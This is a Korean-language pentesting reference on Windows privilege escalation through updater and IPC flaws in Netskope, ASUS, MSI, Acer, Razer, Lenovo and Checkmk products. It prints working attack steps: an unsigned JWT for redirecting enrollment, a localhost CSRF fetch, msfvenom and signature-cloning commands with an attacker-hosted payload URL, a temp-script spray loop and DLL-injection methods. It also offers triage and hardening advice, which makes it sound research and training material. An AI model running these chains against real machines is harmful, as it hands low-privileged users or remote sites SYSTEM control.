# Enterprise Auto-Updaters 및 Privileged IPC 악용 (예: Netskope, ASUS 및 MSI)

{{#include ../../banners/hacktricks-training.md}}

이 페이지에서는 low-friction IPC 표면과 privileged update 흐름을 노출하는 엔터프라이즈 endpoint agent 및 updater에서 발견된 Windows 로컬 권한 상승 체인을 일반화합니다. 대표적인 사례는 R129 미만의 Netskope Client for Windows(CVE-2025-0309)로, low-privileged 사용자가 enrollment를 attacker-controlled 서버로 유도한 다음 악성 MSI를 전달해 SYSTEM 서비스가 설치하도록 할 수 있습니다.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

유사한 제품에 재사용할 수 있는 핵심 아이디어:
- privileged service의 localhost IPC를 악용해 enrollment 또는 reconfiguration을 attacker 서버로 유도합니다.
- 벤더의 update endpoint를 구현하고, rogue Trusted Root CA를 전달한 다음 updater가 악성 “signed” package를 사용하도록 합니다.
- 취약한 signer 검사(CN allow-list), 선택적 digest 플래그, 느슨한 MSI 속성을 우회합니다.
- IPC가 “encrypted”인 경우, 레지스트리에 저장된 world-readable machine identifier에서 key/IV를 도출합니다.
- 서비스가 image path/process name으로 호출자를 제한한다면, allow-listed process에 inject하거나 suspended 상태로 실행한 뒤 최소한의 thread-context patch로 DLL을 bootstrap합니다.

Custom local TCP service는 PIN이나 다른 애플리케이션 자격 증명이 필요하더라도 동일하게 신원 및 입력 경계 검토가 필요합니다. listener를 해당 process 및 유효한 service account와 연결한 다음, 실제 배포된 binary/version과 호출자가 제어하는 필드가 고정 버퍼에 복사되거나 child-process command를 구성하는 데 사용되기 전에 길이 검사를 거치는지 확인합니다. [Microsoft의 buffer-overrun guidance](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns)는 privileged native code에서 검사되지 않은 외부 입력이 위험한 이유를 설명합니다. Loopback listener, hardcoded credential 또는 process name만으로는 memory corruption이나 SYSTEM 실행이 입증되지 않습니다. 도달 가능성, authorization, code path 및 mitigations는 각각 별도의 조건입니다. 일반적인 열거 작업은 수동으로 수행하고, 실행 중인 서비스에 crash가 발생할 정도로 긴 입력을 보내지 마세요.

---
## 1) localhost IPC를 통해 enrollment를 attacker 서버로 유도하기

많은 agent에는 localhost TCP를 통해 JSON을 사용해 SYSTEM service와 통신하는 user-mode UI process가 포함되어 있습니다.

Netskope에서 관찰된 구성:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit 흐름:
1) backend host(예: AddonUrl)를 제어하는 claims를 포함한 JWT enrollment token을 만듭니다. 서명이 필요하지 않도록 alg=None을 사용합니다.
2) JWT와 tenant name을 사용해 provisioning command를 호출하는 IPC message를 보냅니다:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) 서비스가 enrollment/config를 위해 사용자가 제어하는 서버에 요청하기 시작합니다. 예:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

참고:
- 호출자 검증이 경로/이름 기반이라면, allow-list에 등록된 vendor 바이너리에서 요청을 보냅니다(§4 참조).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) 업데이트 채널 하이재킹으로 SYSTEM 권한으로 코드 실행

클라이언트가 사용자의 서버와 통신하면, 예상되는 엔드포인트를 구현하고 클라이언트가 공격자 MSI를 받도록 유도합니다. 일반적인 순서는 다음과 같습니다.

1) /v2/config/org/clientconfig → 매우 짧은 updater 간격을 설정한 JSON config를 반환합니다. 예:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate를 반환합니다. 서비스는 이를 Local Machine Trusted Root store에 설치합니다.
3) /v2/checkupdate → 악성 MSI와 가짜 버전을 가리키는 metadata를 제공합니다.

실제 환경에서 흔히 볼 수 있는 검사를 우회하는 방법:
- Signer CN allow-list: 서비스는 Subject CN이 “netSkope Inc” 또는 “Netskope, Inc.”와 같은지만 확인할 수 있습니다. rogue CA로 해당 CN을 가진 leaf를 발급하고 MSI에 서명할 수 있습니다.
- CERT_DIGEST property: CERT_DIGEST라는 benign MSI property를 포함합니다. 설치 시 enforcement는 없습니다.
- Optional digest enforcement: config flag(예: check_msi_digest=false)를 사용하면 추가 cryptographic validation을 비활성화할 수 있습니다.

결과: SYSTEM 서비스가
C:\ProgramData\Netskope\stAgent\data\*.msi
에서 MSI를 설치하고, 임의의 코드를 NT AUTHORITY\SYSTEM 권한으로 실행합니다.<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass 교훈: vendor가 update source를 cryptographically authenticate하는 대신 소수의 “trusted” domain만 allow-list에 넣는다면, 여전히 트래픽을 유도할 수 있는 vendor 소유 redirector나 reverse proxy를 찾아보세요. Netskope의 경우, 공개된 후속 연구에 따르면 R129-era allow-list도 attacker가 제어하는 Azure App Service 콘텐츠를 proxy하는 `rproxy.goskope.com`을 통해 우회할 수 있었습니다. Hostname allow-list는 trust boundary가 아니라 장애물 정도로 간주하세요.<sup>[[14]](#references)</sup>

---
## 3) 암호화된 IPC request 위조(존재하는 경우)

R127부터 Netskope는 IPC JSON을 Base64처럼 보이는 encryptData field로 감쌌습니다. 분석 결과, 모든 사용자가 읽을 수 있는 registry 값에서 key/IV를 파생하는 AES를 사용했습니다:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

공격자는 암호화를 재현해 표준 사용자 권한으로 유효한 암호화 명령을 보낼 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup> 일반적인 팁: agent가 갑자기 IPC를 “암호화”하기 시작하면, HKLM 아래의 device ID, product GUID, install ID 등을 key material로 사용하는지 찾아보세요.

---
## 4) IPC caller allow-list 우회(path/name 검사)

일부 서비스는 TCP 연결의 PID를 확인한 다음, image path/name을 Program Files 아래에 있는 vendor binary allow-list(예: stagentui.exe, bwansvc.exe, epdlp.exe)와 비교해 peer를 인증하려 합니다.

실용적인 우회 방법 두 가지:
- allow-list에 포함된 process(예: nsdiag.exe)에 DLL injection을 수행하고 내부에서 IPC를 proxy합니다.
- allow-list에 포함된 binary를 suspended 상태로 실행하고 CreateRemoteThread 없이 proxy DLL을 bootstrap해 driver가 적용하는 tamper 규칙을 만족합니다(§5 참조).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection에 적합한 injection: suspended process + NtContinue patch

제품에는 보호된 process의 handle에서 위험한 권한을 제거하는 minifilter/OB callbacks driver(예: Stadrv)가 포함되는 경우가 많습니다:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME를 제거합니다.
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE만 허용합니다.

이러한 제약을 준수하는 신뢰성 있는 user-mode loader:
1) CREATE_SUSPENDED를 지정해 vendor binary를 CreateProcess합니다.
2) 아직 허용된 handle을 가져옵니다. process에는 PROCESS_VM_WRITE | PROCESS_VM_OPERATION 권한을, thread에는 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT 권한을 가진 handle을 가져옵니다(또는 알려진 RIP에서 code를 patch하는 경우 THREAD_RESUME만 가져옵니다).
3) ntdll!NtContinue(또는 다른 초기 단계의, 반드시 mapping되는 thunk)를 덮어써서 DLL 경로에 대해 LoadLibraryW를 호출한 뒤 원래 실행 흐름으로 돌아가는 작은 stub을 작성합니다.
4) ResumeThread를 호출해 process 내부에서 stub을 실행하고 DLL을 로드합니다.

이미 보호된 process에 대해 PROCESS_CREATE_THREAD나 PROCESS_SUSPEND_RESUME을 사용하지 않았으므로(직접 생성했기 때문에), driver의 정책을 준수합니다.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) 실용적인 tooling
- NachoVPN(Netskope plugin)은 rogue CA 생성, 악성 MSI 서명, 필요한 endpoint 제공을 자동화합니다: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope는 임의의 IPC message(선택적으로 AES-encrypted)를 생성하고, allow-list에 포함된 binary에서 요청을 보내도록 suspended-process injection을 수행하는 custom IPC client입니다.<sup>[[4]](#references)</sup>

## 7) 알 수 없는 updater/IPC surface의 신속한 triage workflow

새로운 endpoint agent나 motherboard “helper” suite를 분석할 때, privesc 대상으로 유망한지 판단하기에는 보통 다음의 빠른 workflow만으로 충분합니다:<sup>[[6]](#references)</sup>

1) loopback listener를 열거하고 vendor process와 연결합니다:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) 후보 named pipe 열거:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) 플러그인 기반 IPC 서버에서 사용하는 레지스트리 기반 라우팅 데이터 탐색:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) 먼저 user-mode 클라이언트에서 endpoint 이름, JSON 키, command ID를 추출합니다. 패키징된 Electron/.NET 프런트엔드에서 전체 스키마가 자주 leak됩니다:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) 프로세스를 최종적으로 실행하는 코드 경로만 찾지 말고, 실제 신뢰 조건을 찾아라:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

우선순위가 높은 패턴:
- `CryptQueryObject`/인증서 파싱은 있지만 `WinVerifyTrust`가 없는 경우, 대개 “인증서가 존재한다”는 사실을 “인증서가 신뢰할 수 있다”는 의미로 취급한 것입니다. 이를 통해 인증서를 복제하거나 다른 가짜 서명자 기법을 사용할 수 있습니다.
- `Origin`, `Referer`, 다운로드 URL, 프로세스 이름 또는 서명자 CN에 대한 부분 문자열/접미사 검사는 인증이 아닙니다. `contains(".vendor.com")`은 공격자가 통제하는 유사 도메인을 이용해 악용할 수 있는 경우가 많습니다.
- 권한이 낮은 GUI가 “파일을 신뢰할 수 있다”고 판단하고 SYSTEM broker가 그 결과만 소비한다면, 클라이언트 측 DLL/JS를 패치하거나 재구현하는 것만으로도 경계를 완전히 우회할 수 있습니다(Razer 유형의 분리 검증).
- broker가 페이로드를 `%TEMP%`/`C:\Windows\Temp`에 복사한 뒤 해당 경로에서 검증하거나 예약한다면, 즉시 TOCTOU 교체 가능 구간과 더 약한 검사를 적용하는 `ExecuteTask()` 래퍼를 노출하는 인접 플러그인 모듈이 있는지 확인하세요.<sup>[[6]](#references)</sup>

named pipe를 많이 사용하는 대상에서는 프로토콜을 깊이 리버싱하기 전에 PipeViewer로 약한 DACL과 원격에서 접근 가능한 pipe를 빠르게 찾아볼 수 있습니다.<sup>[[11]](#references)</sup>

대상이 호출자를 PID, 이미지 경로 또는 프로세스 이름만으로 인증한다면, 이를 보안 경계가 아닌 장애물 정도로 취급하세요. 합법적인 클라이언트에 주입하거나 허용 목록에 있는 프로세스에서 연결하면 서버 검사를 통과하기에 충분한 경우가 많습니다. named pipe의 경우 [클라이언트 가장 및 pipe 악용에 관한 이 페이지](named-pipe-client-impersonation.md)에서 해당 기법을 더 자세히 다룹니다.

권한이 높은 **정리 또는 복원 broker**의 경우 pipe ACL뿐 아니라 경로 신뢰 경계도 확인하세요. 서비스 실행 파일과 설치 디렉터리가 보호되어 있더라도, 권한이 낮은 호출자가 공유 디렉터리의 복원 대상 경로를 선택하거나 스테이징된 백업 파일의 이름을 변경할 수 있습니다. 호출자가 복원 명령을 실행할 수 있는지, 정확한 스테이징 입력 파일 또는 파일명을 수정할 수 있는지, broker가 더 높은 권한으로 실행되는지, 복원 작업이 실제로 선택된 보호 경로에 쓰는지 각각 확인하세요. 쓰기 가능한 스테이징 디렉터리나 읽을 수 있는 pipe만으로 임의의 권한 있는 쓰기가 입증되는 것은 아닙니다. 대상 경로 매핑과 서비스 동작은 코드 검토 또는 통제된 테스트로 확인해야 합니다. 알 수 없는 정리 명령은 사용자 파일을 삭제할 수 있으므로 수동 열거 중에는 실행하지 마세요.

---
## 8) 공급업체 서명만으로 인증되는 모듈형 add-in broker (Lenovo Vantage 패턴)

주목할 만한 최신 공격 대상은 **서명된 클라이언트 RPC broker**입니다. 권한이 낮은 Lenovo 서명 데스크톱 프로세스가 SYSTEM 서비스와 통신하고, 서비스는 `%ProgramData%` 아래의 XML로 기술된 add-in 집합에 JSON 명령을 전달합니다. 허용된 서명 클라이언트 중 하나에서 코드 실행을 달성하면 모든 `runas="system"` 계약이 공격 표면에 포함됩니다.<sup>[[15]](#references)</sup>

Lenovo Vantage 연구에서 관찰된 가치 높은 기법:
- **공급업체 서명을 이유로 호출자를 신뢰**: 연구자들은 Lenovo 서명 EXE를 쓰기 가능한 디렉터리에 복사하고 DLL side-load (`profapi.dll`) 조건을 충족해 임의의 코드가 서비스가 이미 신뢰하는 클라이언트 내부에서 실행되도록 함으로써 인증된 컨텍스트에 도달했습니다.
- **Manifest 기반 공격 표면 탐색**: add-in은 `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` 아래에 선언되어 있습니다. 일부 계약은 `SYSTEM` 권한으로 실행되므로, broker 자체를 리버싱하는 것보다 manifest를 열거하는 편이 실제 권한 있는 명령을 더 빠르게 찾는 경우가 많습니다.
- **인증된 채널 뒤에 있는 명령별 취약점**: 신뢰된 클라이언트 내부에 진입한 뒤, 공개된 연구를 통해 업데이트/설치 명령의 경로 순회 및 경쟁 조건, 권한 있는 설정 데이터베이스의 raw SQL 악용, 의도된 하이브 바깥에 쓰기를 가능하게 한 부분 문자열 기반 레지스트리 경로 검사가 발견되었습니다.

대상에서 유용한 정찰 항목:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

실용적인 요점: helper suite가 먼저 **호출자 프로세스**를 인증한 다음 수십 개의 plugin/add-in 명령으로 디스패치하는 broker를 제공한다면, 입구의 신뢰 검사를 우회하는 데서 멈추지 마세요. manifest/contract 테이블을 덤프하고 각 고권한 verb를 독립적으로 fuzzing하세요. 인증된 채널 뒤에는 보통 여러 2단계 버그가 숨어 있습니다.

---
## 1) 권한이 높은 HTTP API를 대상으로 한 브라우저-to-localhost CSRF (ASUS DriverHub)

DriverHub는 127.0.0.1:53000에서 사용자 모드 HTTP 서비스를 제공하는 ADU.exe를 설치하며, 이 서비스는 https://driverhub.asus.com에서 오는 브라우저 호출을 기대합니다. Origin 필터는 Origin 헤더와 `/asus/v1.0/*`에서 노출되는 다운로드 URL에 대해 `string_contains(".asus.com")`만 수행합니다. 따라서 `https://driverhub.asus.com.attacker.tld`와 같이 공격자가 제어하는 호스트도 검사를 통과해 JavaScript에서 상태 변경 요청을 보낼 수 있습니다.<sup>[[6]](#references)</sup> 추가 우회 패턴은 [CSRF 기초](../../pentesting-web/csrf-cross-site-request-forgery.md)를 참조하세요.

실제 공격 흐름:
1) `.asus.com`을 포함하는 도메인을 등록하고 그곳에 악성 웹페이지를 호스팅합니다.
2) `fetch` 또는 XHR을 사용해 `http://127.0.0.1:53000`의 권한이 높은 엔드포인트(예: `Reboot`, `UpdateApp`)를 호출합니다.
3) 핸들러가 기대하는 JSON 본문을 전송합니다. 패킹된 프런트엔드 JS에 아래 스키마가 나와 있습니다.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

아래에 표시된 PowerShell CLI도 Origin 헤더를 신뢰되는 값으로 스푸핑하면 성공합니다:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

공격자 사이트를 브라우저에서 방문하기만 하면 1-click(또는 `onload`를 통한 0-click) 로컬 CSRF가 발생해 SYSTEM helper를 구동합니다.

---
## 2) 안전하지 않은 코드 서명 검증 및 인증서 복제 (ASUS UpdateApp)

`/asus/v1.0/UpdateApp`은 JSON 본문에 지정된 임의의 실행 파일을 다운로드하고 `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`에 캐시합니다. 다운로드 URL 검증에도 동일한 substring 로직을 재사용하므로 `http://updates.asus.com.attacker.tld:8000/payload.exe`가 허용됩니다. 다운로드 후 ADU.exe는 PE에 서명이 있는지, Subject 문자열이 ASUS와 일치하는지만 확인한 다음 실행합니다. `WinVerifyTrust`도, 체인 검증도 없습니다.

이 흐름을 weaponize하려면:
1) payload를 만듭니다(예: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) ASUS의 signer를 payload에 복제합니다(예: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) `asus.com`을 흉내 낸 도메인에 `pwn.exe`를 호스팅하고, 위의 브라우저 CSRF를 통해 UpdateApp을 트리거합니다.

Origin 및 URL 필터가 모두 substring 기반이고 signer 검사는 문자열만 비교하므로, DriverHub는 공격자 바이너리를 가져와 상승된 컨텍스트에서 실행합니다.<sup>[[6]](#references)</sup>

---
## 1) updater의 복사/실행 경로 내 TOCTOU (MSI Center CMD_AutoUpdateSDK)

MSI Center의 SYSTEM 서비스는 각 프레임이 `4-byte ComponentID || 8-byte CommandID || ASCII arguments`인 TCP 프로토콜을 노출합니다. 핵심 컴포넌트(Component ID `0f 27 00 00`)에는 `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`가 포함되어 있습니다. 해당 handler는 다음을 수행합니다.
1) 전달받은 실행 파일을 `C:\Windows\Temp\MSI Center SDK.exe`에 복사합니다.
2) `CS_CommonAPI.EX_CA::Verify`를 통해 서명을 검증합니다(인증서 subject가 “MICRO-STAR INTERNATIONAL CO., LTD.”와 일치하고 `WinVerifyTrust`가 성공해야 함).
3) 공격자가 제어하는 인수를 사용해 임시 파일을 SYSTEM으로 실행하는 scheduled task를 만듭니다.

복사된 파일은 검증과 `ExecuteTask()` 사이에 잠기지 않습니다. 공격자는 다음을 할 수 있습니다.
- 유효한 MSI 서명 바이너리를 가리키는 Frame A를 보냅니다(서명 검증을 통과하고 task가 예약되도록 함).
- 검증 완료 직후 `MSI Center SDK.exe`를 덮어쓰도록 악성 payload를 가리키는 Frame B 메시지를 반복해서 보내 race를 겁니다.

scheduler가 실행될 때는 원본 파일만 검증했음에도 덮어쓴 payload를 SYSTEM으로 실행합니다. 안정적인 exploit을 위해 두 개의 goroutine/thread에서 TOCTOU 구간을 차지할 때까지 CMD_AutoUpdateSDK를 반복 호출합니다.<sup>[[6]](#references)</sup>

---
## 2) 사용자 정의 SYSTEM 수준 IPC 및 impersonation 악용 (MSI Center + Acer Control Centre)

### MSI Center TCP command 집합
- `MSI.CentralServer.exe`가 로드하는 모든 plugin/DLL은 `HKLM\SOFTWARE\MSI\MSI_CentralServer`에 저장된 Component ID를 받습니다. 프레임의 처음 4바이트로 해당 component를 선택하므로 공격자는 임의의 module로 command를 보낼 수 있습니다.
- Plugin은 자체 task runner를 정의할 수 있습니다. `Support\API_Support.dll`은 `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}`을 노출하고 **서명 검증 없이** `API_Support.EX_Task::ExecuteTask()`를 직접 호출합니다. 따라서 로컬 사용자는 누구든지 `C:\Users\<user>\Desktop\payload.exe`를 지정해 SYSTEM 실행을 확정적으로 얻을 수 있습니다.
- Wireshark로 loopback을 sniff하거나 dnSpy에서 .NET 바이너리를 instrument하면 Component와 command 간 대응 관계를 빠르게 파악할 수 있습니다. 그런 다음 사용자 정의 Go/Python client로 프레임을 재전송할 수 있습니다.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipe 및 impersonation 수준
- SYSTEM으로 실행되는 `ACCSvc.exe`는 `\\.\pipe\treadstone_service_LightMode`를 노출하며, 해당 discretionary ACL은 원격 client(예: `\\TARGET\pipe\treadstone_service_LightMode`)를 허용합니다. 파일 경로와 함께 command ID `7`을 보내면 서비스의 process-spawning routine이 호출됩니다.
- client library는 인수와 함께 magic terminator byte(113)를 직렬화합니다. Frida/`TsDotNetLib`를 사용한 dynamic instrumentation([Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)의 instrumentation 팁 참고)을 통해 native handler가 이 값을 `CreateProcessAsUser` 호출 전에 `SECURITY_IMPERSONATION_LEVEL` 및 integrity SID에 매핑하는 것을 확인할 수 있습니다.
- 113(`0x71`)을 114(`0x72`)로 바꾸면 전체 SYSTEM token을 유지하고 high-integrity SID(`S-1-16-12288`)를 설정하는 generic branch로 진입합니다. 따라서 생성된 바이너리는 로컬 및 다른 머신을 통한 경우 모두 제한 없는 SYSTEM 권한으로 실행됩니다.
- 노출된 installer flag(`Setup.exe -nocheck`)와 조합하면 lab VM에서도 ACC를 설치하고 vendor 하드웨어 없이 pipe를 테스트할 수 있습니다.<sup>[[6]](#references)</sup>

이러한 IPC 버그는 localhost 서비스가 상호 인증(ALPC SID, `ImpersonationLevel=Impersonation` 필터, token filtering)을 강제해야 하는 이유와, 각 module의 “임의 바이너리 실행” helper가 동일한 signer 검증을 공유해야 하는 이유를 보여줍니다.

---
## 3) 취약한 user-mode 검증에 의존하는 COM/IPC “elevator” helper (Razer Synapse 4)

Razer Synapse 4는 이 계열에 또 다른 유용한 패턴을 추가했습니다. 낮은 권한의 사용자가 COM helper에 `RzUtility.Elevator`를 통해 process를 실행해 달라고 요청할 수 있으며, 신뢰 여부 판단은 권한 경계 내에서 강력하게 적용되는 대신 user-mode DLL(`simple_service.dll`)에 위임됩니다.

관찰된 exploit 경로:
- COM object `RzUtility.Elevator`를 instantiate합니다.
- `LaunchProcessNoWait(<path>, "", 1)`을 호출해 elevated launch를 요청합니다.
- 공개 PoC에서는 요청을 보내기 전에 `simple_service.dll` 내부의 PE-signature gate를 patch out하여 공격자가 선택한 임의의 executable을 실행할 수 있게 합니다.<sup>[[6]](#references)[[10]](#references)</sup>

최소 PowerShell 호출:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

일반적인 결론: “helper” suite를 reverse engineering할 때 localhost TCP나 named pipes만 확인하고 멈추지 마세요. `Elevator`, `Launcher`, `Updater`, `Utility` 같은 이름의 COM class를 확인한 다음, privileged service가 실제로 대상 binary 자체를 검증하는지, 아니면 patch할 수 있는 user-mode client DLL이 계산한 결과를 그저 신뢰하는지 검증하세요. 이 패턴은 Razer에만 국한되지 않습니다. high-privilege broker가 low-privilege 측에서 전달한 허용/거부 결정에 의존하는 분할 설계라면 무엇이든 privesc 공격 표면이 될 수 있습니다.


---
## MSI 복구 중 예측 가능한 임시 script 실행 (Checkmk Agent / CVE-2024-0670)

일부 Windows agent는 여전히 `C:\Windows\Temp`에 임시 `.cmd` 파일을 작성하고 `SYSTEM`으로 실행해 privileged action을 수행합니다. 파일명이 예측 가능하고 service가 기존 파일을 안전하게 다시 생성하지 않는다면, low-privileged user가 나중에 생성될 임시 파일을 **읽기 전용**으로 미리 만들 수 있습니다. 그러면 privileged process는 자체 script 대신 공격자가 제어하는 content를 실행하게 됩니다.

취약한 Checkmk Agent 빌드에서 확인된 사항:
- 임시 파일 패턴: `cmk_all_<PID>_1.cmd`
- 영향받는 branch: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: 캐시된 agent package의 MSI **복구**<sup>[[8]](#references)[[9]](#references)</sup>

실행 절차:
1. 현재 process ID 또는 실행 중인 agent PID를 바탕으로 현실적인 PID 범위를 추정합니다.
2. 짧은 **ASCII** `.cmd` payload를 작성합니다 (`Set-Content -Encoding Ascii` 또는 `cmd.exe` redirection을 사용하고, batch file에는 UTF-16 PowerShell 출력을 사용하지 마세요).
3. 후보 범위 전체에 걸쳐 `C:\Windows\Temp\cmk_all_<PID>_1.cmd`를 spray하고 각 파일을 읽기 전용으로 설정합니다.
4. 캐시된 MSI의 복구를 trigger해 privileged service가 임시 script를 다시 생성한 뒤 실행하도록 합니다.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

취약한 제품이 Windows Installer로 설치된 경우, 복구를 실행하기 전에 `C:\Windows\Installer`에 있는 무작위처럼 보이는 캐시된 MSI를 제품 이름과 연결하세요:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operational notes:
- `qwinsta`는 `msiexec /fa`가 비대화형 WinRM 셸에서 실패하고, 기존 데스크톱/연결 끊긴 세션에서 복구를 올바르게 시작할 수 있는지 확인해야 할 때 유용합니다.<sup>[[7]](#references)</sup>
- 이 패턴은 **모든 사용자가 쓸 수 있는 위치에 임시 스크립트를 배치한 뒤 SYSTEM 권한으로 실행하는** 다른 엔드포인트 에이전트와 업데이터에도 적용됩니다. 예측 가능한 이름, 배타적 생성 의미 체계의 부재, 필요할 때 트리거할 수 있는 복구/업데이트 흐름을 테스트하세요.

### 대화형 설치 프로그램 복구 및 권한 있는 콘솔

PDF24 Creator 11.15.1은 별도의 MSI 복구 위험을 보여 줍니다. 프린터 설치 사용자 지정 작업이 복구 중 SYSTEM 권한으로 표시되는 콘솔을 시작할 수 있습니다. 공급업체는 이 동작을 해결하기 위해 11.15.2에서 MSI 설치 프로그램을 변경했습니다. 이전 제품 버전은 초기 조사 단서일 뿐입니다. 등록되었거나 접근 가능한 MSI 패키지인지, 현재 사용자가 복구를 시작할 수 있는지, 취약한 사용자 지정 작업과 로그 파일 지연이 존재하는지, 대화형 데스크톱에서 콘솔을 표시할 수 있는지 확인하세요. 보고된 지연은 `faxPrnInst.log`에 oplock을 설정해 발생시켰습니다. 일반적인 파일 쓰기 권한만으로 접근이 가능한 것은 아닙니다. 비대화형 셸, 접근할 수 없는 패키지 또는 패치된 설치 프로그램은 공격 체인을 끊을 수 있습니다. 이 문제는 `AlwaysInstallElevated`에 의존하지 않으며, 예측 가능한 임시 스크립트를 교체하는 것과도 다릅니다.

---
## 취약한 업데이터 검증을 통한 원격 공급망 하이재킹 (WinGUp / Notepad++)

2025년 6월부터 2025년 12월까지, Notepad++ 업데이트 흐름을 지원하는 호스팅 인프라를 침해한 공격자들은 선별된 피해자에게 악성 매니페스트를 제공했습니다. 이전 WinGUp 기반 업데이터는 업데이트의 진위를 완전히 검증하지 않아, 악의적인 XML 응답으로 클라이언트를 공격자가 제어하는 URL로 리디렉션할 수 있었습니다. 클라이언트는 다운로드한 설치 프로그램에 대해 신뢰할 수 있는 인증서 체인과 유효한 PE 서명을 모두 확인하지 않은 채 HTTPS 콘텐츠를 수락했으므로, 피해자는 트로이 목마화된 NSIS `update.exe`를 다운로드하고 실행했습니다.<sup>[[12]](#references)[[13]](#references)</sup>

운영 흐름(로컬 exploit 불필요):
1. **인프라 가로채기**: CDN/호스팅을 침해하고, 공격자 메타데이터를 포함한 업데이트 확인 응답으로 악성 다운로드 URL을 지정합니다.
2. **트로이 목마화된 NSIS**: 설치 프로그램이 페이로드를 가져와 실행하고 두 가지 실행 체인을 악용합니다.
   - **Bring-your-own signed binary + sideload**: 서명된 Bitdefender `BluetoothService.exe`를 함께 배포하고 검색 경로에 악성 `log.dll`을 놓습니다. 서명된 바이너리가 실행되면 Windows가 `log.dll`을 sideload하고, 이 DLL은 Chrysalis 백도어의 암호를 해독한 뒤 reflectively load합니다(정적 탐지를 어렵게 하기 위해 Warbird 보호와 API hashing을 사용).
   - **Scripted shellcode injection**: NSIS가 컴파일된 Lua 스크립트를 실행합니다. 이 스크립트는 Win32 API(예: `EnumWindowStationsW`)를 사용해 shellcode를 주입하고 Cobalt Strike Beacon을 배치합니다.<sup>[[12]](#references)</sup>

모든 자동 업데이터에 적용할 보안 강화/탐지 지침:
- 다운로드한 설치 프로그램의 **인증서 + 서명 검증**을 강제하고(공급업체 서명자를 고정하고, CN/체인이 일치하지 않으면 거부), 업데이트 매니페스트에도 서명하세요(예: XMLDSig). 검증되지 않은 매니페스트 제어 리디렉션을 차단하세요.
